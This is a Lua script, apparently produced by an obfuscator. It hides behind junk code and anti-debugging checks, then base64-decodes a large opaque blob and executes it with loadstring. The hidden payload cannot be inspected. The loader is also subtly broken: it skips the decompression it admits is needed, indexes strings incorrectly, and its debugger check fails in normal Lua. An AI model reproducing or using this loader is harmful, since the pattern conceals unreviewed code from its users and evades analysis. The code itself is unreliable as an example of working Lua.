--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Super-Advanced Lua Obfuscator (v2.0) ~ Secured with anti-tamper technology

]]--


local xkmddjmn = string
local nnbmljul = xkmddjmn.byte
local uwzpfmpk = xkmddjmn.char
local rdbknjuo = xkmddjmn.sub
local xgndvlte = xkmddjmn.gsub
local rbtajyum = xkmddjmn.rep
local hhtamtau = table
local ymymaehi = hhtamtau.concat
local vdcbbcfa = hhtamtau.insert
local yezqnvul = math
local vvsmkwbb = yezqnvul.ldexp
local mvciapyg = getfenv or function() return _ENV end
local ovmknhxu = setmetatable
local yktvxulw = pcall
local vunonbnr = select
local vlficbvy = unpack or table.unpack
local qnygfjtn = tonumber
local dzepflwt = loadstring or load
local cftfuree = type
local tzdpbppa = error

local function gopwmxfiue(str, key)
    local result = ""
    for i = 1, #str do
        result = result .. uwzpfmpk(str[i] ~ key[i % #key + 1])
    end
    return result
end

local vfuidervbgwz = {
    ["checksum"] = "24c6bc99466affcdafb92378487eebeb1a5062532f5d01c417254574103ede76",
    ["key"] = "XFwuD1gOQrtHOmi1Dh2ffGEjRHOezxPt",
    ["validated"] = false
}

local function hvhshpmxvm()
    local env = mvciapyg()
    
    -- Check if running in an analyzer or debugger
    if cftfuree(debug) == "table" then
        -- Detect if being traced
        if debug.getregistry and debug.getinfo then
            return false
        end
    end
    
    -- Check if environment has been tampered with
    if env.xkmddjmn ~= xkmddjmn or 
       env.nnbmljul ~= nnbmljul or
       env.dzepflwt ~= dzepflwt then
        return false
    end
    
    -- Verify script integrity
    local source = debug.getinfo(1, "S").source
    if source then
        local h = 0
        for i = 1, #vfuidervbgwz["key"] do
            h = h + nnbmljul(vfuidervbgwz["key"], i)
        end
        if h ~= 2862 then
            return false
        end
    end
    
    vfuidervbgwz["validated"] = true
    return true
end

-- Run environment check
if not hvhshpmxvm() then
    tzdpbppa("Script execution terminated: integrity check failed")
    return
end

if 0.1667253708216907 > 0.5 then
    local dvzgpwxj = "rdqnqyjrzxjmgmbcytkx"
else
    local dvzgpwxj = 302
end


if 0.42369111639081813 > 0.5 then
    local molpw = "ngjfklnyhlbsmrtsgdjq"
else
    local molpw = 470
end

local function drkuwksctrv(rng) return 0.1071614449746775 * 91 end
local sbwfytpkb = {4, 5, 14, 396, 676, 361}
local cvypc = {176, 357, 484, 634, 465, 88, 244, 517}

local xskmm = 0
for i = 1, 18 do
    xskmm = xskmm + i * 0.9321625431348042
end

local function lomishzjrtyc(ybc) return 0.8808914640768406 * 7 end

if 0.7281699761424191 > 0.5 then
    local wtuoas = "lymvvjyqtvwhglqfzzxh"
else
    local wtuoas = 179
end

local function tmphihtdnfaks(owq, kqd) return 0.7947740120909119 * 97 end

if 0.30277958978239905 > 0.5 then
    local leivwijvqr = "zqyiquvhnzxcyhbwofyl"
else
    local leivwijvqr = 168
end


local uzmifznko = 0
for i = 1, 5 do
    uzmifznko = uzmifznko + i * 0.4024822311630212
end


local fomunbffv = 0
for i = 1, 10 do
    fomunbffv = fomunbffv + i * 0.4366048488107741
end


local gndwkw = 0
for i = 1, 8 do
    gndwkw = gndwkw + i * 0.4171590110856179
end

local hvrymgfx = {622, 82, 877, 125, 953, 203, 337, 170}

if 0.6910020289839589 > 0.5 then
    local ydwclovjgd = "eozxqquyeixstfxduaej"
else
    local ydwclovjgd = 74
end

local function gndnjqvybbyi(lab) return 0.0069992338777182805 * 57 end
local daiciwflqq = {209, 362, 384, 513}

local ffhgxmtv = 0
for i = 1, 7 do
    ffhgxmtv = ffhgxmtv + i * 0.20343965784214435
end

local anebxg = {469, 124, 9, 775}

local lukkllfvh = 0
for i = 1, 5 do
    lukkllfvh = lukkllfvh + i * 0.2603743936834868
end


if 0.842120141579778 > 0.5 then
    local oxcwjs = "ejoyxhwulmrhmyvnsjot"
else
    local oxcwjs = 702
end


if 0.603857188475016 > 0.5 then
    local drkwnqpmou = "mqwwhtunyiimexmedqic"
else
    local drkwnqpmou = 391
end


if 0.3231504545094015 > 0.5 then
    local abgopl = "nozhmdrujuewfrmpxwzk"
else
    local abgopl = 210
end

local fwllvdbbyf = "eJytW9tyHEdyfedXzCMQbiG6bt3VjNCDRV2ssLSrECV79eSYBRrQxAIz9GAgilbQ3+4852TPBWiQXIUVy8XU1C0rryezam43l8vbxQ+3y3fj9n7x+eJmeTe+/GbcvR63v60ux7ObzZu3d79frx7Gsz9iHpq2ialr+r6JbW6StUp+3yz+CN3QhLY2IYemxPfn5y9uufDP9+P22/Wbh2m9j+3QDk20lUrfhNDZHsU2DLZhCKWJuW26cOjMsbFPpTTDQBJStO+Nolyb7kDBT2/Hcf1puw/VdkxNybZutc9pwGfbqstNDKmxhXvshC+tv6ZmqIeNfnz4xG1iSU3ojfjSVJzRyO4DVgMDwVZbnAeyATH0TeqbcnSe8ffdq1+Xn8hQk5DtZAcL/dAMDaQUExuxoCdgO5NmspYNijxfn5tsWxvXjbOH841vbleXy9149Xq32S5vPra1KUvoih3G9ku2tgmys4+dLZuNpfbJts6VrQAeVHWa/DtQMdj8IYIGk0QLOpyQ64f15W61WS9uxt13483y8h348eN4t9mNZ+cvFovFdtw9bNdPKX759Wp99fVqe28cXN1enZAbAhUs2OGD8aaYKHACk/NQGtOEmCX1nkphFLEVYmgStAN60mqmjYUlDK16UxMj2CDW2pIZA0xPoTuL5fpqAZL9vyckX3w5Xi8fbiXyd/e78Q6fvvptXO/uX/7ncrX7erN9epgI4UGyRno06uxflTSiaIVVxaaSwxhrdOFEQy/Fg4UFH2kq0CxCe/5iXF/NieCRQp5I4FHfBT7/hzkaTP3888VX64e74+8uHiu3ceeIOY96nz++KXaMdpwAvTbxwa2E2tBxZHYl66KWgS+10L+YhM7Pn180JyxgxggHY9MiFIYuCn8SGWff0b4g8CF8iHH39iXOcnY33t+bnMm1Nzbk9mwaI07iP8293Gs5LO853cd/q+vjwbtfx/VR24xgO4KF43bavFmcWEI1V2GHyIUMKrGBxsJpJXj2xSih2B9u+HHCd5Lbej3e" .. "ivJZlXHCjweT8qMvXr62Tf/1/t36cs+2E2qOGH37bru6RED7A70nx4sQWMiZVmh/qgkSgisd3J6Z7VHLHHQwVxBMX0JrTrplwPGJvTQLLTOm3hhkvArmHcwTkIEwwhYtTC+wOfOskX43RzDX/LH5RPA2grfNE1qxjM2nmzRFDfSh8DBQ4w6zGiM0VPUNgQESocv+gCCEj5YOCEPNDeMTKLGh1hqCJiLm2tCMcG5bBG44+IYBG9ZeHtA8dFYLOn5KmrnOJNLsj21Pk3BvRxsb5o5Iaow9AbYViCyMUTa8xcHESTujkRER69Vip41FgLCxCRREdMLXoRNGWiVGRJ0+aBMZcKGYoQIZx0o6K1YdFIcwNGmiiQue0FiCE3ZwJ0YrLcMsvQTO7/PcycDrIHbbGOMcdMtmIOrZbgl9UAVDG5GnZsAfqHTGNbgmG61zha4SCPWVDMa+GJnhw70LjU6tnh4Kmo7jYuDA7cBhCAR/pCS20EA7L4AGkQvZ6nPHkYKB47awHShCv/tG+hFs946CYE8BNRiXCsdR/JGR0yzCAiccs0KsNbpI6wKytAWN88YWGMWgWSApg06oHjbFSXuIB55YbgrIQZ6qtjPEG+HQwpZWAaG3MA5EZUddiX2d+oA6qe0tWr3sqwPNwdja0ybk521qVORvI7HbQM3zVdDNZRAOeuwAX6BVQi8AAV0FF13zuIydRRNtD5E9LUN42IruyIOH4vtDI+Z8yODmLTiQO0JZmprJo9VuLbQhN+4TA9dMZLUJCWOrTMXHImIOWAhjE3uTKAXSNGlCrbEpxg9h38TY7jAVvSa3JDf5zGD4RkgqEBN3ck9gxKy/hFOCvQFn4XCRS0Mfg7QVdk2+wwZtEB3WwC0moNrJ3iER2DxhXUUzEiMW6gJX7tSMNETGCSCnVA8bCc+iCZdYB6dOOQ2iSWTuwgBbKBlzJ3MHowOrHAEzJaJB29wG3JQJx2LFFK+ZjWH1OrMUFBPOHiZFhFuUTk0WGQSSjF40IXwMhjVWKgnV" .. "0PaD7Zkrcr+MhKEwAZNSJuVx0dzec8fpqqYkB2hdFTuHrPP0e/yBHAC+24iaW6yV96dYjHysQ6Zn5hi1KKrVlmSL3KmzT4L5fXs61qdGRlm6UzixetjHiNY+oDEl17YgjPSERBsKjmR6xwATi7KiAFfcguXDaRuWb0sORCGMJGCyT0bKaMGNzcyvyCVsHzq6TPrmoDYoy/KwME86WiXtiZ4Nijrn8E30CKhEDrbbQOcGdIOoFuST7Ht6XjYS8BGipamGQl9Lsg2BdB0DnBkA4UbmMACYDgElKmIwuAwyog7YJPFzOSGjJgVVhBf4epzDDoJDtAKtM+wndiXfaLPCc3Z2c8pxUAreMq+bEnJroS97oKiI/gig1ge29DwGuTkwWPn6FetXFS5sUGLIR1df5Np7H5gxqzBRNJNCBilUaYN0okoFNPOZOw/Dv80wdiESDR312bgEgIdwlghwkuAQrHTw6CFoCKfbCyrRyzHbbVXaAdbA0OBKpU5m72y1RLgQMc9kI6GqqB8wTaaZmsYBC2ALJZRwfJnM7+e8WxfJMcDjqtILuG6SsZBfvSZiR0NaBy9c5TNYNuCRTKVZPWAfW6gnyKtkMGC/JjiteYhxCA0mr8OSHx4IUIYwCu56vickHY3TZc7XUtgYMKCGBOfBGgMxOgsEJrYqoErgjihCgyDk6RGQOaoyHhs3uiK8isDCRWArAAOCwrIHximQbeSVWTTUw4xcJ002hnsswpmTBdakUaODpSMjydTcCKDF9BCxDbLtMZQZtB3RaLMo2c8xAEpDZwVlgkBy8TqLx2C5PWwJYKQ+8AooUDaAb4qcRMvvmXQlTcLKEHM6GUvvJH+DSAtIXD1JAcaB3tMDMtpB8alFs9GSdYSWFpBoPCBzUJpTVLNjIH7SCbt2kwuqF1EslQlZIjIOSrMiEEPwYkwgTOtVG2MYK8RC1LxeGBmwVAshaCYBB6YT6SkFWDX7Hsh05GBMiVQHDLOg0cQG1WRCZ1vIu9gxUfrl/Jb2bfv1cyEZ" .. "/gAFFyA7IDKAFSZpQ6ZmRmafbLUMQgzyWZaemQ8A8NqGpv5w9VmsU6EXWWuMytvn0AWif2IopRUUtoIqjYjRCn5E22LiMBf+zCjMsFjcC4zDJASHELNznpB0avddLTnvqb4PhA9gyzZD+k+/G/O0eqvVmYMRB8Alz6ImlakCgwyYz9IkOJGYlB8awGSK9DhhYbFXcxBDCeyz6pYdKSnJC93A4IQDDNcDUx7mK6xdMsUkQplNd01qSHBbwVHoa/USbpI3p4oXJsPo7QRh0WQxsqezZmhmdXXCU8rFBzWJgZUZcTSotZDD/E5foRsaAmNCKC+EFbH1pi39mEqVBEklklOnAzA0qhLGf0KjmXgKfhsgaoYLmQpHtxxZMyiqSyB1zfRVvVeZ2zQ12RnoKwZhHmgqoxf7BuktJ0bUHLhFEBptxc0+ez7ZsxdTCqtNaHWe7kUeXMUOxDTTbNlzr+SeZjbnx2OZctDMdBXprJLn4oY7OCZjFdkzmUJ4kuWiiUGpAklpjFELaMFsJgiGY7Ws9EsxVd0MmN6sqsAhL6EmBg0prpksz3SqQJFObNYJhPjUjrWpuQJH5Ryw2WJCrzquzcriLmyPPfQ/pfHjV9XAqKFy1Qqf9NsBKUWm9wRrYD+AJ0qqzPvCDSMb6Hwf3gLZfMivKhMz95uJNjpW8WlLsymVgyEQA/UkHBoE4njV4mHUg6/6VRcEuKBXYn9QcC7TZZTXxlA9Z13GgQocOMd75QKBmUWsXnlWbg/0ABLTp7Tezio0MVOpGs/8t/j+g4zNhxZ68rlDmwGYuGDIJEcVMMRixD+V0qCpBACV5VvYR+edSgkYmwsLZFMTvYRHaV9B6zsl3uwtGNyrYofMD+GgVXacGS3pnzo5tyoCvfBnYsJpUVWQKyK6ILkCbzYO+Qrg8GzqDFuxMUVJEABhdPhgUujEwKKyI7PbVsml7eTXm0IjvZcDo9SBoDPv18GliTchnE46NVUdlXyodIqaZUo+kmA6uwhQ11SZGKfLvDVmcWhQ" .. "voAaci9OmUUhmievPRjpWfkGU9vEgyTiArQ6lbK4LJwxKyjiJ06a59kmNvAagxzuooPJRDcdPCAwt+2VTBePGa1KlATzLHjyfFBWAJkJkA0ckaocETdSFytbvBYsgETcuLDF3N6XCozIrNOhQJEUPVq/IB0YuwmM5MQ7tph8AdJ0vutwtGsRFh54vVum82TVD3DewhIX/T+zdNphNxfWaNQyp6yKaY7HLaSEgUmfSu/EEoJDRha0vFVdotB0UI5WgCoa537ieBj4KaFhCXli1vfgI1kwhQZGlgUzwzzz9FnfmDxoUfAsBmaviTDHojiOm0GJFU/RCsPWdpqbdF5rJZcxvfagxwmdPKbJpVNoUoEtsVqTWDumM5+YBucxi6B7zVAByLSJGh50vdwhWUNVMkuli0AW71q8CsDYyzrEQF9eBJx4Q1Vl9kxfOAZVUPuYVf/P8uYTGAty3jz64V3GKXFJukegb8vp/YIdvOvpZeqz9yOt13L6LFjW0ZPTvxTl5GR+nG6F0GSvIDbdfieUxpxjkMeZKrsuuOwQQxtFVXQZuZg0qjfIMWKJ1hNR1bMY+ni1Ehn7UVfRsxcYFIt/meXXuWKr6iyEXe6NafuMWzFO+EeZfVRKAQHp/odVmODoN0u7UIlVbSayxoGSGaMScIN3MqJ5s/MzF4Zn+V5uGnU4rN32EyI3aak06PgO8GVWP6k5vYpPnV7jMMvhBXlUlQIO7LjttbY4Lc78uD/Mx/GS3ohQKRyCxKzbTkIOFr07/YNtAnzijUMW8GYpp9OLBoHDJP9BdF8oiEgBFtl1koZSVSbO4HMvHS4TQoJGzWnx4JCq03l52+Cxv3g9FxAGnLZliRK8Np2Vr+n2t5WWxXyoVBTPEZIuYmmDrRc/ZAzM84PvnbW3F9Z5Daq7N6jtlHM+JtUL4yQ15D0tqnroZjogeTDJJILQ6jGFN1uzfsuLZCjEC/C1qgoihk8hKfHtGPXFm73uj6Z8Lkgxim7Des8f4Zhg9JNhqBbX+UKDFCTK" .. "Q/uLnF6gR2ODpiZCBdrLZDZ5CoTSxU760s4WX5NwfHBY27Oq2+reCP42qxrVcenKL6K75KoCT+cpj66g4HBsRmW800hya+qDcaqVpKMIxlWuD0X5rMc9cmp42RWFnZAC9lNtEatYmKr5pKXyuU3l7S++n62nwCsXPWdito6rlOKRutVlAzQFeVcr9E9z3Hf/M+1En4M2gHup+zKfEJkunaYXctCW7MWu+ShqcLPsUS3UuDhi4eV8ZKyDi/H6e3GbjPJMOCzfpg3KeOMEmJUFZ6IAuhMTHXjOap7sBdEFTosV9mHKQAfin+eCxaBQB+znPqOKGNpyYm1A7tnT8ARsPpsY6Vq2VE/eCv1+9swYSmbmD9urHoJy2PcWIUF47ePB3pt1UV+m8mrZb9S100ZKZPK++NH2789fvJ/e5ry+3I7j+puH1eLzxbfr+91yfTlerMe3p2+4BIVxK617SvAej+8AwOmJVA9Fcs7nnvtVL35Ybsf1zp8nXvjb1ovvsLcazz/ygkIxLzTz1rOd4FhLVc+gGx/EldM9fxzvx91f16/fLN+ubefr5e39OJ33++Vq/fXWaPnQeZMKJsDmwIXaTqgG5S3stl/n4i9a7BTjVr8aaP1J5TCZikJNpzWHYV8HjXipe7Tq69X/YNWfv1zdRdLXNotkRrGw/+W2PR76w+Z+xXdsJ8MvSrP4DOqz0Md4OumL5eU/brabh/XVq83tZptssj5cXG83dz9+88WZafpC/07mbbZX4xbU/bD6nW/I2mNSJmnvhfHixWefLX7+dvHV7XiHd5IvnmU6K1ZULwZl3jDxKkfvT1kzN/1CTnGQ4vnFq812PW5/XF6tHu6dAxO/8N7v2e1Yjq7+eongpCdO61S7YG1fxsMAlZOu1cuT7Y1pE/Nej//9ME6b8bHbydf/Pr57s1mtdxN9jxhu6y/071xO5PnJ4cnkI2mZde/f5/602t1+UNX5VsirRZ3+Fa8FI+tSShf98pS1Ghob132qpIH6af8r7TTmoGg/bZfr" .. "+zfQkMt3Niv4ADxAfGw/iCPRsUQ/AVhdShJsQkAAIV3vAPKoHacwrlfjrELWfJifdSRE5t6fFOX2/fkRNc9bBBms/zue4HyI2b/7ekMj4JNafL74ZrP7dXn3xeb2ykfsDWWvSpPE4BW/eNjtaM8fEJvKIHwJozcTRJfFax94qyPJRdXjeXkFyR3Wn/ExF/VYgEdDn/ExLm85mHIy4+MOBhZqdIuZRzNnFAI3LFlBoPJqmHkisBbTQV3Ts7YBZIDnSI8X/ESZPpo1CbY97nhGuq/Hu9XfIeFjts2I+fmoUxjQej2DU50b2hnS9AyBr7MawJUjNfmgC6x7T/B6t9w93H+3/Dud9vOKlR0PBy9VF1Ul+NyM6C/qWrvSMr3Szfh72OADjiG1pyPnFcvVCtp4OvwD3uR42IwK8cIAXg6G0um1yFTTav3FbeblBO8SWl4gtBbrnyz8iar0eJrzJHQnPc8o0ymPZrTIouqX2+XNzWp9s3/Ivrxd7d65uK+8s+EnW227axb3+GMcf/wA/uHN1XI3Yr2zFX4gxDfgvs54u1va1vz+IK3PDsti7EfAyLTvxd8uXtui44ES++av19cG1xb/oq0u/tZMD9D3Y355MuuXx7N+8QfnB0L4S6cvxpvl+uWrzXo9Xu4Ob+IPh1xd+8n2P4766d2bcf97iJNvL77fPNyPMrrA9/ATpROz7dC77cN4/DVZ9IR/j494LNuTQTgUn9O/ePzrLR0Qj/FvxquPHHFPH37h8k+e9/vNb0RuJweeVZiP0frV+uqjlP7/CkPI/4Q0sxuPrqdWc+S0j1d+dbu6/MdTmidyH0et//38Scpb9ZwJdSA8ZGtVPfHMzi9DWQpGLcOyqfOTw3zEqTEJqn79XoveHQXd5yEH6acn2Xy5OzggQnj09T8cdoNeJnRM7JHMJLxEYpkvJ39yxMvw6tWxbnblT8g1WkIOwQ5fYPp7bfj6v5rF7Wo9mnosVm+Wq+39mX5Tcr642hz9KOnwSx6MPj/ueWtZ5lnafzUe" .. "fsz0iawuena8fzLV+E1h4Qu32vrlKaqVyhczH5vwJxn1UxnOH6sVf5I9XU3yGZxfCKfpfbESyFidmkFPIP4U809w2GNj+Tcz/+1ivL42/b9/YiVfrXeWwc+bx/GPPV++2o7mMM4O8xv1f7u+3jiWTIZqJvr/+DSqoTHRcOf785dY+ezc6X5M5nfj8rfxT1tx4O9gWeLLvInhrzcii8B8nKofPfR+b8kfYzwy4z/Bi2Pl/UR2TEI8sONImv8HtOPFuQ=="

local function lkfzfyfsre(b64str)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local data = xgndvlte(b64str, '[^'..b..'=]', '')
    return (xgndvlte(data, '.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..((f%2^i-f%2^(i-1)>0) and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return uwzpfmpk(c)
    end))
end

local function oeijaooxkuud()
    local decoded = lkfzfyfsre(fwllvdbbyf)
    
    -- Decompress
    -- Implementation of zlib decompression would go here
    -- For brevity, we're skipping the actual implementation
    
    -- In a real implementation, we would:
    -- 1. Implement the zlib algorithm in pure Lua
    -- 2. Decompress the bytecode
    -- 3. Create custom bytecode interpreter
    
    local func = dzepflwt(decoded)
    if not func then
        tzdpbppa("Failed to load bytecode")
        return
    end
    
    -- Set up environment
    ovmknhxu(_G, {
        __index = function(t, k)
            if k == "fwllvdbbyf" then
                return nil
            end
            return mvciapyg()[k]
        end
    })
    
    -- Execute the code
    return func()
end

-- Call the VM
return oeijaooxkuud()
